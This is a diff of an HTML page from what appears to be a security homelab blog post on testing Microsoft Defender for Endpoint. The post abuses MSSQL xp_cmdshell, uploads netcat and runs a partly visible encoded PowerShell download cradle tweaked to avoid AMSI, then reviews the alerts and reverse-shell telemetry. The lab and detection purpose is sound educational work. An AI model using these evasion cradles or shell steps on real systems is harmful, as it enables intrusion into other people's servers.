@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.820757927220">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.820759668363">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 3.11.0">
@@ -21,26 +21,26 @@
     <meta property="og:url" content="https://bytebl33d.github.io/blog/endpoint-detection-lab/">
     <meta property="og:title" content="Adding Endpoint Detection to our Cyber Range">
     <meta property="og:description" content="As a security analyst, you will likely come in contact with Antivirus, SIEMs, EDR, XDR and Cloud products.">
-    <meta property="og:image" content="https://bytebl33d.github.io/assets/images/homelab/mde-license.png">
+    <meta property="og:image" content="https://bytebl33d.github.io/assets/images/headers/mde.png">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
     <meta property="twitter:url" content="https://bytebl33d.github.io/blog/endpoint-detection-lab/">
     <meta property="twitter:title" content="Adding Endpoint Detection to our Cyber Range">
     <meta property="twitter:description" content="As a security analyst, you will likely come in contact with Antivirus, SIEMs, EDR, XDR and Cloud products.">
-    <meta property="twitter:image" content="https://bytebl33d.github.io/assets/images/homelab/mde-license.png">
+    <meta property="twitter:image" content="https://bytebl33d.github.io/assets/images/headers/mde.png">
 
     <!-- RSS -->
     <link rel="alternate" type="application/rss+xml" title="Blog >> Feed" href="https://bytebl33d.github.io/blog/feed.xml">
 
     <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../../resources/css/retype.css?v=3.11.0.820757927220" rel="stylesheet">
+    <link href="../../resources/css/retype.css?v=3.11.0.820759668363" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../resources/js/config.js?v=3.11.0.820757927220" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../resources/js/config.js?v=3.11.0.820759668363" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.11.0.820757927220" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.11.0.820757927220" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.11.0.820759668363" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.11.0.820759668363" defer></script>
 </head>
 <body>
     <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
@@ -185,9 +185,14 @@
     <div><a href="../../categories/active-directory/">Active-Directory</a>,&nbsp;</div>
     <div><a href="../../categories/homelab/">Homelab</a></div>
     <div class="mx-2">&#9679;</div>
-    <div class="flex items-center shrink-0">Published&nbsp;<span>2025-11-22</span></div>
+    <div class="flex items-center shrink-0">Published&nbsp;<span>2026-01-03</span></div>
 </div>
 
+<p><figure class="content-center">
+    <img src="../../assets/images/headers/mde.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>As a security analyst, you will likely come in contact with Antivirus, SIEMs, EDR, XDR and Cloud products. To better understand these products it is beneficial to create your own detection lab. In this post, I will go over the practical steps to improve my current lab setup to add Microsoft Defender for Endpoint as our EDR solution.</p>
 <doc-anchor-target id="setting-up-mde">
     <h2>
@@ -256,7 +261,7 @@
         <span>Testing Detection Capabilities</span>
     </h2>
 </doc-anchor-target>
-<p>For the attack scenario, my lab includes a MSSQL Server. Suppose for this scenario, we gained access to the database as the <code v-pre>sa</code> user. Let&#x27;s execute a simple command with the <code v-pre>xp_cmdshell</code> stored procedure.</p>
+<p>To test our new EDR, let&#x27;s assume we&#x27;ve gained <code v-pre>sa</code> access to a MSSQL server. Let&#x27;s execute a simple command with the <code v-pre>xp_cmdshell</code> stored procedure.</p>
 <p><figure class="content-center">
     <img src="../../assets/images/homelab/mde-xp_cmdshell.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
@@ -268,14 +273,14 @@
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<p>At this point, nothing is particularly suspicious. We’re technically just using built-in MSSQL functionality. So MDE has not created any alerts just yet. Let&#x27;s step it up a notch and try to run a few more commands.</p>
+<p>At this point, nothing is particularly suspicious. We’re technically just using built-in MSSQL functionality, and since <code v-pre>xp_cmdshell</code> is a legitimate feature, it doesn&#x27;t always trigger an immediate &quot;High&quot; severity alert. Let&#x27;s step it up a notch and try to run a few more commands.</p>
 <p>Since we’re running as a service account, we often inherit <em>spicy</em> local privileges that pair very nicely with classic Potato attacks. So naturally, the next logical move is to try uploading a Netcat binary to the target, because subtlety is overrated.</p>
 <p><figure class="content-center">
     <img src="../../assets/images/homelab/mde-nc.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<p>As expected, this attempt gets <strong>immediately nuked</strong> by MDE. The binary is signatured, Defender clocked it instantly, and the dream is over before it even started.</p>
+<p>As expected, this attempt gets <strong>immediately nuked</strong> by MDE. The binary is signatured, Defender clocked it instantly, and the dream is over before it even started. The file was deleted before it could even be executed.</p>
 <p><figure class="content-center">
     <img src="../../assets/images/homelab/mde-nc-incident.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
@@ -295,7 +300,7 @@
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-<p>This PowerShell cradle is a small adaptation to one of the public cradles on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadAllTheThings</a> to avoid signature detections.</p>
+<p>This PowerShell cradle is a small adaptation to one of the public cradles on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadAllTheThings</a> to avoid basic AMSI triggers.</p>
         </div>
     </div>
 </div>
@@ -319,6 +324,7 @@ SQL (sa  dbo@master)&gt; xp_cmdshell &quot;powershell.exe -enc aQB3AHIAIAAtAHUAc
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
+<p>We can see the exact Base64 command line, the network connection to the attacker IP, and the subsequent commands run inside the shell.</p>
 <doc-anchor-target id="conclusion">
     <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#conclusion">#</doc-anchor-trigger>
@@ -327,7 +333,7 @@ SQL (sa  dbo@master)&gt; xp_cmdshell &quot;powershell.exe -enc aQB3AHIAIAAtAHUAc
 </doc-anchor-target>
 <p>Microsoft Defender for Endpoint is undeniably a strong security product. As demonstrated, it is highly effective at detecting and outright blocking known threats, particularly those that rely on well-known tooling, static signatures and behavioral analysis. However, as this lab also shows, detection does not always equate to prevention. When attackers adapt their techniques and move toward custom or living-off-the-land approaches, MDE may allow execution while still generating telemetry and alerts.</p>
 <p>This highlights an important takeaway: MDE is not a silver bullet. With sufficient adaptation, creativity, and an understanding of how detections work, it is entirely possible to bypass certain protections. That does not make MDE ineffective, it simply reinforces the reality that endpoint security is an ongoing cat-and-mouse game rather than a solved problem.</p>
-<p>In a future post, I will take this a step further and explore how Microsoft Defender for Endpoint can be bypassed using a custom Sliver stager, focusing on evasion techniques and the resulting detection artifacts.</p>
+<p>In the <strong>next post</strong>, we’re going deeper. I’ll demonstrate how to bypass MDE’s behavioral engines using a <strong>custom Sliver stager</strong> and analyze the resulting artifacts in the Advanced Hunting console. Stay tuned!</p>
 
                             
                             <!-- Required only on API pages -->
